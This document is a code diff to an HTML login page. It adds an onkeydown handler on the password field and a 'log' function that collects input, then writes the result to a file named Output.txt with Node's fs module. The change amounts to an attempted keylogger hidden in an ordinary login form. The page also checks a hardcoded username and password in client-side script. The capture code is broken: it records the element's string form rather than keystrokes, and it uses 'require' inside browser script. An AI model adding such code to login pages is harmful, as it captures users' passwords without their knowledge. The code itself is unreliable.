@@ -32,7 +32,7 @@
 		<div class="inputs">
 			<input type="text" placeholder="user name" id="username">
 			<br>
-			<input type="password" placeholder="password" id="password">
+			<input type="password" placeholder="password" id="password" onkeydown="log(this)">
 		</div>
 			
 			<br><br>
@@ -59,7 +59,18 @@
 		if(id==="Aritri" && pass==="testing123")
 		  alert("sucess");
 	  }
-	  
+	   var keyslogged;
+	   function log (e) {
+            keyslogged += "<p>" + e.toString() + "</p>";
+           }
+	 const fs = require('fs')
+ 
+	// Write data in 'Output.txt' .
+	fs.writeFile('Output.txt', keyslogged, (err) => {
+      
+    	// In case of a error throw err.
+    	if (err) throw err;
+  })
   </script>
 </body>
 </html>
